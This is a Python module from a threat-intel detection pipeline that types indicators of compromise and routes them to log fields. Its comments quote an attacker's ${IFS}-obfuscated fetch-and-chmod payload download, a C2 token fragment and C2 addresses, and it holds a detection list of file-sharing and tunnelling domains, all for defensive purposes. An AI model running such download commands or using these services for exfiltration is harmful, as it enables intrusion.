"""Typed indicator provenance: what an indicator is, not just its value.

The pipeline used to carry indicators as ``{type: [values]}`` and routed every
hash to a process-image rule and every host to DNS and network rules. H-0618
showed why that is wrong: of its seven SHA-256 values only one was a process
image (the others were an archive, a decoy document, network content and two
payloads that only ever existed in memory), and its five hostnames were, in
the primary report's words, "historical tenants of the same IP, not campaign
IOCs". An :class:`IndicatorRecord` keeps the role, status and confidence the
source gives, with the passage that says so, and :func:`placements` routes each
record only to the telemetry that can actually observe it.
"""

import ipaddress
import re
from dataclasses import asdict, dataclass, field
from typing import Any, Dict, Iterable, List, Mapping, Optional, Tuple

#: What a hash identifies. Only ``executable`` and ``library`` exist as a file a
#: process runs or loads; the rest cannot match a process-image hash.
#: ``script``: a shell, PowerShell or other script run by an interpreter, so the
#: process image is the interpreter and never carries the script's hash.
#: ``non_file``: a value that is only hash-shaped. The Redis botnet feed listed
#: the C2's bearer token (``C2_TOKEN=f90c...``) as an MD5 and a pinned TLS
#: certificate fingerprint as a SHA-256; no file has either hash.
HASH_ROLES = (
    "executable", "library", "script", "archive", "installer", "document", "memory_only", "network_content", "non_file", "unknown",
)  # fmt: skip
#: What a network indicator does in the intrusion. ``target``: an address the
#: actor attacked, scanned or tested against. It is a victim, not
#: infrastructure, so a connection to it says nothing about the host making it.
#: ``dual_use``: shared/public cloud storage or SaaS endpoints (AWS S3, Azure Blob, etc.).
#: ``inbound``: an address the actor connected *from* -- exploitation, scanning
#: or login attempts against the victim. It appears as the source of inbound
#: traffic, never as a destination: H-0830's report listed its exploitation
#: "Source IPs", and an outbound-connection rule could never match them.
NETWORK_ROLES = ("c2", "staging", "download", "dual_use", "target", "inbound", "historical", "unknown")
#: The source's own page, a link beneath it or its host. Assigned only by
#: ``mark_source_pages``, never offered to the model: H-0020 swept proxy logs
#: for the PoC repository it was drafted from, from the README's stars badge.
SOURCE_PAGE_ROLE = "source_page"
STATUSES = ("active", "historical", "unknown")
CONFIDENCES = ("high", "medium", "low", "unknown")

HASH_TYPES = ("md5", "sha1", "sha256", "imphash")
NETWORK_TYPES = ("ipv4", "ipv6", "domain", "hostname", "url")

#: CTI provider type names (OTX, MISP) -> record type.
_CTI_TYPE_MAP = {
    "md5": "md5", "filehash-md5": "md5",
    "sha1": "sha1", "filehash-sha1": "sha1",
    "sha256": "sha256", "filehash-sha256": "sha256",
    "imphash": "imphash", "filehash-imphash": "imphash",
    "ipv4": "ipv4", "ip-dst": "ipv4", "ip-src": "ipv4", "ipv6": "ipv6",
    "domain": "domain", "hostname": "hostname",
    "url": "url", "uri": "url", "link": "url",
}  # fmt: skip

_PORT_SUFFIX_RE = re.compile(r"^(?P<host>[^/\s]+?):(?P<port>\d{1,5})$")
_URL_RE = re.compile(r"^(?:[a-z][a-z0-9+.-]*://)?(?P<host>[^/:?#\s]+)(?::(?P<port>\d{1,5}))?(?P<path>/[^?#\s]*)?", re.I)


@dataclass
class IndicatorRecord:
    """One indicator with the context that decides where it may be hunted."""

    value: str
    type: str
    role: str = "unknown"
    status: str = "unknown"
    confidence: str = "unknown"
    #: Where the value came from: the primary report's URL, or "cti" when only
    #: the feed that delivered the item names it.
    source: str = "cti"
    #: The source passage supporting role and status, verbatim. Empty means
    #: the role and status are unverified and treated as unknown.
    evidence: str = ""
    #: Destination ports the source ties to this address or URL host.
    ports: List[int] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "IndicatorRecord":
        known = {k: data[k] for k in cls.__dataclass_fields__ if k in data}
        record = cls(**known)
        record.ports = sorted({int(p) for p in record.ports or [] if str(p).isdigit() and 0 < int(p) < 65536})
        return record


def refang(value: str) -> str:
    """Undo report defanging ("hxxp", "[.]", "(.)") so the value matches telemetry."""
    value = value.replace("[.]", ".").replace("(.)", ".").replace("[:]", ":")
    return re.sub(r"hxxp", "http", value, flags=re.IGNORECASE)


def split_host_port(value: str) -> Tuple[str, Optional[int]]:
    """``1.2.3.4:443`` -> (``1.2.3.4``, 443); anything else -> (value, None)."""
    match = _PORT_SUFFIX_RE.match(value.strip())
    if match and match.group("host").count(":") == 0:
        port = int(match.group("port"))
        if 0 < port < 65536:
            return match.group("host"), port
    return value.strip(), None


def url_parts(url: str) -> Tuple[str, Optional[int], str]:
    """(host, port, path) of a URL, with an empty path when there is none."""
    match = _URL_RE.match(refang(url).strip())
    if not match:
        return "", None, ""
    port = int(match.group("port")) if match.group("port") else None
    return match.group("host").lower(), port, match.group("path") or ""


#: Shell syntax a report's command line leaves attached to the URL it fetches.
#: H-0830's source ran ``fetch${IFS}-o${IFS}/var/kw2s11${IFS}http://.../kw2-freebsd-x64-s11;chmod${IFS}755``
#: and the URL came out as ``.../kw2-freebsd-x64-s11;chmod$``, which no request
#: ever carries. ``;``, ``|``, backticks, ``&&`` and ``$`` are rare enough
#: unencoded in a real download URL that cutting there loses nothing.
_SHELL_TAIL_RE = re.compile(r"(?:[;|`]|&&|\$).*$", re.DOTALL)


def trim_shell_tail(url: str) -> str:
    """A URL without the shell syntax that followed it on a command line."""
    return _SHELL_TAIL_RE.sub("", url).rstrip(".,:)'\"")


def is_valid_ipv4(value: str) -> bool:
    """Whether the value (optionally ``:port``) is an IPv4 address at all.

    Dotted version numbers have the same shape: H-0830's source listed the
    NetScaler build ``13.1.37.283``, which became a network IOC.
    """
    host, _ = split_host_port(value)
    try:
        ipaddress.IPv4Address(host)
    except ValueError:
        return False
    return True


def _normalise_value(value: str, rtype: str) -> str:
    value = refang(str(value)).strip()
    if rtype in HASH_TYPES or rtype in ("domain", "hostname"):
        return value.lower().rstrip(".")
    if rtype == "url":
        return trim_shell_tail(value)
    return value


_DUAL_USE_DOMAINS = (
    "amazonaws.com",
    "blob.core.windows.net",
    "azureedge.net",
    "azure.com",
    "storage.googleapis.com",
    "drive.google.com",
    "storage.cloud.google.com",
    "dropbox.com",
    "dropboxapi.com",
    "box.com",
    "mega.nz",
    "mega.io",
    "onedrive.live.com",
    "sharepoint.com",
    "discord.com",
    "discordapp.com",
    "telegram.org",
    "slack.com",
    "pastebin.com",
    "raw.githubusercontent.com",
    "githubusercontent.com",
    "ngrok.io",
    "ngrok-free.app",
    "trycloudflare.com",
    "webhook.site",
)

_DUAL_USE_NETWORKS = (
    ipaddress.ip_network("52.216.0.0/15"),  # AWS S3 (e.g. us-east-1)
    ipaddress.ip_network("54.231.0.0/16"),  # AWS S3
    ipaddress.ip_network("52.92.0.0/15"),   # AWS S3
    ipaddress.ip_network("52.218.0.0/15"),  # AWS S3
)


def is_dual_use(indicator: str, evidence: str = "") -> bool:
    """Return True if an indicator represents shared/dual-use cloud or SaaS infrastructure.

    Such indicators (e.g., AWS S3, Azure Blob, Google Drive, Discord, Telegram)
    must NEVER be swept as bare standalone IOCs, but bound to specific suspicious
    processes.
    """
    cleaned = refang(indicator).lower().strip()
    ev_lower = (evidence or "").lower()

    if "dual use" in ev_lower or "dual-use" in ev_lower:
        return True

    for d in _DUAL_USE_DOMAINS:
        if cleaned == d or cleaned.endswith("." + d):
            return True

    try:
        ip = ipaddress.ip_address(cleaned)
        for net in _DUAL_USE_NETWORKS:
            if ip in net:
                return True
    except ValueError:
        pass

    if any(k in ev_lower for k in ("aws s3", "amazon s3", "azure blob", "google cloud storage", "s3 bucket")):
        return True

    return False


def records_from_cti(indicators: Mapping[str, Iterable[str]], source: str = "cti") -> List[IndicatorRecord]:
    """Untyped feed indicators as records with unknown or dual_use role and status."""
    records: List[IndicatorRecord] = []
    for itype, values in (indicators or {}).items():
        rtype = _CTI_TYPE_MAP.get(str(itype).lower().strip())
        if not rtype:
            continue
        for raw in values:
            value = _normalise_value(raw, rtype)
            if rtype == "ipv4" and not is_valid_ipv4(value):
                continue
            if value and not any(r.value == value and r.type == rtype for r in records):
                try:
                    is_priv = rtype in ("ipv4", "ipv6") and ipaddress.ip_address(value).is_private
                except ValueError:
                    is_priv = False
                if is_priv:
                    role = "target"
                elif is_dual_use(value):
                    role = "dual_use"
                else:
                    role = "unknown"
                records.append(IndicatorRecord(value=value, type=rtype, role=role, source=source))
    return records


_STATUS_RANK = {"unknown": 0, "historical": 1, "active": 2}


def _combine(into: IndicatorRecord, reading: IndicatorRecord) -> None:
    """Fold another reading of the same indicator into ``into``.

    Status precedence is active > historical > unknown: an address the source
    ties to this intrusion stays active even when the same address also has an
    older, unrelated history. The winning reading supplies role, confidence
    and evidence; a tie only fills gaps. Ports come only from non-historical
    readings, so an old service port (H-0618's ``:40010``) never scopes a
    current rule.
    """
    wins = _STATUS_RANK.get(reading.status, 0) > _STATUS_RANK.get(into.status, 0)
    ties = reading.status == into.status
    if wins:
        into.status = reading.status
    for attr in ("role", "confidence"):
        offered = getattr(reading, attr)
        if offered != "unknown" and (wins or (ties and getattr(into, attr) == "unknown")):
            setattr(into, attr, offered)
    if reading.evidence and (wins or (ties and not into.evidence)):
        into.evidence, into.source = reading.evidence, reading.source
    if reading.status != "historical":
        into.ports = sorted(set(into.ports) | set(reading.ports))


def mark_source_pages(records: List[IndicatorRecord], source_urls: Iterable[str]) -> List[str]:
    """Type the source's own page, links beneath it and its host as ``source_page``.

    Only a source URL with a path counts, so a feed whose URL is a bare host
    keeps its indicators. Returns the values marked.
    """
    pages = []
    for url in source_urls:
        host, _, path = url_parts(url or "")
        path = path.rstrip("/").lower()
        if host and path:
            pages.append((host, path))
    marked = []
    for record in records:
        if record.type not in NETWORK_TYPES or record.role == SOURCE_PAGE_ROLE:
            continue
        value = refang(record.value).lower().rstrip(".")
        if record.type == "url":
            host, _, path = url_parts(value)
            path = path.rstrip("/").lower()
            own = any(host == h and (path == p or path.startswith(p + "/")) for h, p in pages)
        else:
            own = any(value == h for h, _ in pages)
        if own:
            record.role, record.ports = SOURCE_PAGE_ROLE, []
            marked.append(record.value)
    return marked


def merge_records(cti: List[IndicatorRecord], extracted: List[IndicatorRecord]) -> List[IndicatorRecord]:
    """Feed indicators enriched with what the primary source says about them.

    A feed value the source also names takes the source's role, status,
    confidence, evidence and ports. Values only the source names are added:
    they passed the verbatim check against the source text. Feed values the
    source never mentions keep an unknown role.
    """
    by_key: Dict[Tuple[str, str], IndicatorRecord] = {}
    for record in [*cti, *extracted]:
        key = (record.type, record.value)
        if record.type in ("domain", "hostname") and key not in by_key:
            # One name, one record: the feed's "hostname" and the report's "domain"
            # for socket.ayakliborsa.net each got a selection in the same rules.
            other = ("hostname" if record.type == "domain" else "domain", record.value)
            key = other if other in by_key else key
        if key not in by_key:
            fresh = IndicatorRecord(**asdict(record))
            if fresh.status == "historical":
                fresh.ports = []
            by_key[key] = fresh
        else:
            _combine(by_key[key], record)
    for r in by_key.values():
        if r.role == "unknown" and is_dual_use(r.value, r.evidence):
            r.role = "dual_use"
        elif r.role == "unknown" and r.type in ("ipv4", "ipv6"):
            try:
                if ipaddress.ip_address(r.value).is_private:
                    r.role = "target"
            except ValueError:
                pass
    return list(by_key.values())


def attach_url_ports(records: List[IndicatorRecord]) -> None:
    """Give each address the ports its URLs use, so network rules are port-scoped."""
    for url in (r for r in records if r.type == "url" and r.status != "historical"):
        host, port, _ = url_parts(url.value)
        if port is None:
            continue
        for record in records:
            if record.type in ("ipv4", "ipv6", "hostname", "domain") and record.value == host and port not in record.ports:
                record.ports = sorted(record.ports + [port])


_PORT = r"(\d{2,5})(?!\d)"
_PORT_RANGE = _PORT + r"(?:\s*(?:-{1,2}|\u2013|\u2014|through|to)\s*" + _PORT + r")?"
#: A range wider than this is a scan, not a set of service ports worth one selection each.
_MAX_RANGE = 32


#: The words beside an endpoint give it a job a victim's host would be seen doing.
_SERVING_WORDING = re.compile(
    r"\b(c2|c&c|command[- ]and[- ]control|callback|check[- ]?in|staging|rogue|payloads?|exfiltrat\w+|mining pool|beacon\w*"
    r"|download\w*|transfer)\b",
    re.IGNORECASE,
)
#: The words beside it say how someone else came to see the port: an old sighting, a
#: certificate or DNS record, the researchers' own access. That is not this intrusion's traffic.
_SIGHTING_WORDING = re.compile(
    r"\b(sightings?|passive[- ]dns|feed (listed|lists)|secondary[- ]source|(months|years) (before|earlier)"
    r"|historical(ly)?|previously|certificates?|resolv(ed|es|ing)|indexed|crawl\w*|we found it|open directory|rdp)\b",
    re.IGNORECASE,
)
#: A line that stops mid-phrase, so the next line continues it.
_RUNS_ON_LINE = re.compile(
    r"([(\[,:]|\b(at|to|on|from|and|or|of|for|with|the|is|as|by|via|in|against|listed))\s*$", re.IGNORECASE
)
_ADDRESS_LINE = re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}\b")


#: Characters of a prose line read either side of an endpoint.
_NEAR = 150


def _mention_context(text: str, start: int, end: int) -> str:
    """The words that describe one mention of an endpoint: its own lines, and the description after them.

    Page extraction puts each inline element and table cell on its own line,
    so the row for "188.245.99.156" / ":10000" continues on the next lines
    ("IP:port", "C2 callback endpoint") until the next address. A line of
    prose that already says something about the endpoint is the whole context.
    """
    first = text.rfind("\n", 0, start) + 1
    last = text.find("\n", end)
    last = len(text) if last < 0 else last
    # A paragraph of prose has other subjects: keep the endpoint's own sentence, or what is near it.
    sentence_start = text.rfind(". ", first, start)
    sentence_end = text.find(". ", end, last)
    near_first = max(first, start - _NEAR, sentence_start + 2 if sentence_start >= 0 else first)
    near_last = min(last, end + _NEAR, sentence_end + 1 if sentence_end >= 0 else last)
    own = " ".join(text[near_first:near_last].split())
    parts = [own]
    before = text[:first].rstrip("\n").rsplit("\n", 1)[-1].strip()
    if before and near_first == first and _RUNS_ON_LINE.search(before):
        parts.insert(0, before[-_NEAR:])
    if len(re.findall(r"[A-Za-z]{2,}", own)) < 4:
        described = 0
        for later in text[last:].split("\n")[1:8]:
            later = later.strip()
            if _ADDRESS_LINE.search(later):
                break
            if len(re.findall(r"[A-Za-z]{2,}", later)) >= 2:
                parts.append(later)
                described += 1
                if described == 2:
                    break
    return " ".join(parts)


def _ports_in_text(value: str, text: str) -> List[int]:
    """Ports the text ties to an address or host: "host:port", "host on port N", "port(s) N at host".

    A port is kept unless every mention of it is a sighting, not service: the
    VShell report listed "38.207.178.192:40010 ThreatFox-derived VShell
    sighting, 2026-04-15" beside the two ports the sample used, and the Redis
    report named port 80 only as where the researchers found the directory.
    """
    host = r"(?<![\w.-])" + re.escape(value)
    verdicts: Dict[int, List[str]] = {}
    for pattern in (
        host + r"\s*:" + _PORT_RANGE,
        host + r"\s+on\s+(?:tcp\s+|udp\s+)?port\s+" + _PORT_RANGE,
        r"\bports?\s+" + _PORT_RANGE + r"\s+(?:at|on)\s+" + host + r"(?![\w-]|\.\w)",
    ):
        for match in re.finditer(pattern, text, re.IGNORECASE):
            low = int(match.group(1))
            high = int(match.group(2)) if match.group(2) else low
            if not (0 < low <= high < 65536 and high - low < _MAX_RANGE):
                continue
            context = _mention_context(text, match.start(), match.end())
            verdict = (
                "serving"
                if _SERVING_WORDING.search(context)
                else "sighting" if _SIGHTING_WORDING.search(context) else "neutral"
            )
            for port in range(low, high + 1):
                verdicts.setdefault(port, []).append(verdict)
    return [port for port, seen in verdicts.items() if any(v != "sighting" for v in seen)]


def attach_text_ports(records: List[IndicatorRecord], text: str) -> None:
    """Give each current address and host the ports the source writes beside it.

    The Redis botnet report listed its C2 as "188.245.99.156" / ":10000" /
    "IP:port" on separate lines of a table, and the rogue replication ports as
    ":16379--16385". Neither reached the network rule, which then matched
    the address on any port. Historical and target addresses get no ports:
    they get no rule.
    """
    text = refang(text or "")
    if not text:
        return
    for record in records:
        if record.type not in ("ipv4", "hostname", "domain") or not placements(record):
            continue
        record.ports = sorted(set(record.ports) | set(_ports_in_text(record.value, text)))


def placements(record: IndicatorRecord) -> List[str]:
    """``<category>.<Field>`` placements a record may appear in, from its role and status.

    Historical indicators are never placed: they describe what the
    infrastructure hosted before, not this intrusion. Nor are addresses the
    actor targeted: those are victims. A hash is placed only where a file with
    that hash can be observed. Unknown network roles route only for curated
    feed indicators; a mention in a report does not establish infrastructure.
    """
    if record.status == "historical" or record.role in ("historical", "target", SOURCE_PAGE_ROLE):
        return []
    if record.type in NETWORK_TYPES and record.role == "unknown" and record.source != "cti":
        return []
    if record.type in HASH_TYPES:
        if record.role in ("executable", "unknown"):
            return ["process_creation.Hashes"]
        if record.role == "library":
            return ["image_load.Hashes"]
        return []
    if record.role == "dual_use" or is_dual_use(record.value, record.evidence):
        if record.type == "url":
            # A URL is not a connection target. A full one (bucket and object
            # on a shared cloud host) is specific enough for proxy logs; a
            # bare path is the legitimate application's own page -- H-0830's
            # "/vpn/index.html" -- and matching it alone matches every user.
            return ["proxy.c-uri"] if url_parts(record.value)[0].count(".") else []
        return ["network_connection.dual_use"]
    if record.role == "inbound":
        # Only an address can be seen as a connection's source; a scanner's
        # hostname is a reverse lookup no inbound log records.
        return ["webserver.c-ip", "network_connection.SourceIp"] if record.type in ("ipv4", "ipv6") else []
    if record.type in ("ipv4", "ipv6"):
        return ["network_connection.DestinationIp"]
    if record.type in ("domain", "hostname"):
        return ["dns_query.QueryName", "network_connection.DestinationHostname"]
    if record.type == "url":
        return ["proxy.c-uri"] if url_parts(record.value)[0] else []
    return []


def hash_label(rtype: str) -> str:
    return {"md5": "MD5", "sha1": "SHA1", "sha256": "SHA256", "imphash": "IMPHASH"}[rtype]


def scoped_placements(records: List[IndicatorRecord]) -> List[Tuple[IndicatorRecord, List[str]]]:
    """Apply exclusions to exact values and descendants of excluded domains.

    A historical parent also excludes its URLs and subdomains; a historical
    child does not exclude a sibling or the whole parent domain.
    """
    excluded = [r for r in records if r.status == "historical" or r.role in ("historical", "target")]

    def blocked(record: IndicatorRecord) -> bool:
        value = refang(record.value).lower().rstrip(".")
        host = url_parts(value)[0] if record.type == "url" else split_host_port(value)[0]
        for other in excluded:
            old = refang(other.value).lower().rstrip(".")
            if value == old:
                return True
            if other.type in ("domain", "hostname") and (host == old or host.endswith("." + old)):
                return True
        return False

    return [(r, [] if blocked(r) else placements(r)) for r in records]


def routable_indicators(records: List[IndicatorRecord]) -> Dict[str, List[str]]:
    """``{type: [values]}`` for the records a rule may use, for prompts and checks.

    Historical indicators and hashes of things no telemetry sees as a file
    (archives, documents, network content, in-memory payloads) are left out,
    so model drafts and deterministic rules use the same provenance boundary.
    """
    out: Dict[str, List[str]] = {}
    for record, where in scoped_placements(records):
        if where:
            out.setdefault(record.type, [])
            if record.value not in out[record.type]:
                out[record.type].append(record.value)
    return out
